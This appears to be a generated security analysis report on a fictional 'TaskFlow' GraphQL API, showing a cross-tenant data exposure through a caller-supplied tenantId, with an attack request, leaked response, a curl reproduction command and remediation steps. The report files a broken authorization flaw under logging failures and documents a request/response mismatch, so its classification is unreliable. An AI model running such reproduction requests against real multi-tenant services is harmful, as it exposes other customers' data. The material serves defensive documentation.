# Security Analysis Report
**System:** TaskFlow Collaboration API
**Domain:** SaaS / Project Management
**Example ID:** GQL-0260
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Logging Failures — Pattern 7.1 | Operational PII/PHI leakage via `listProjects` — cross-tenant project data exposed without audit trail |

---

## Finding 1 — Logging Failures: Operational PII Leakage via Caller-Supplied tenantId (Pattern 7.1)

### Summary
The `listProjects` GraphQL query on TaskFlow Collaboration API (`api.taskflow-collaborati.example.com`) accepts a caller-supplied `tenantId` argument without JWT-based scope enforcement. Per §5.0 Pattern 7.1, the operational PII/PHI leakage occurs because the API returns sensitive project data from `tenant-1047` to an attacker from `tenant-07f2` with no authorization check and no logging of the cross-tenant access attempt. The `getProject` resolver also lacks tenancy checks (§4.0 RISK-GQL-260).

**HAR artifact note:** Request uses `listProjects(tenantId: "tenant-1047")` but response key is `getProject`. This inconsistency exists in context.txt §6.0 and is documented as-is.

**Pattern:** 7.1 — Operational PII/PHI leakage (Logging Failures)
**Affected resolver:** `listProjects(tenantId: ID, status: String)`
**Affected endpoint:** `POST https://api.taskflow-collaborati.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.taskflow-collaborati.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-07f2
Content-Type: application/json

{"query": "query VulnerableOp { listProjects(tenantId: \"tenant-1047\") { projectId ownerId data { sensitiveField } } }"}
```

**Response — Victim Project Data Returned**
```json
{
  "data": {
    "getProject": {
      "tenantId": "tenant-1047",
      "ownerId": "other-user-07f21047",
      "data": { "sensitiveField": "CONFIDENTIAL-07f21047", "internalNotes": "Internal data exposed" }
    }
  }
}
```
Note: `x-request-id: req-07f21047` is a server-assigned **response** header. Not part of the attack request.

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST https://api.taskflow-collaborati.example.com/graphql \
  -H "Authorization: Bearer $TOKEN" -H "x-tenant-id: tenant-07f2" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { listProjects(tenantId: \"tenant-1047\") { projectId ownerId data { sensitiveField } } }"}'
# Vulnerable: Returns CONFIDENTIAL-07f21047 from tenant-1047
# Secure: Returns FORBIDDEN — tenantId derived from JWT only
```

### Remediation
1. Derive `tenantId` from `$jwt.tenantId` only — ignore caller-supplied argument.
2. `WHERE tenant_id = $jwtTenantId` in all project resolvers.
3. Log all cross-tenant access attempts with requesting identity and queried tenant.
4. Cache key: `project:{tenantId}:{projectId}`.
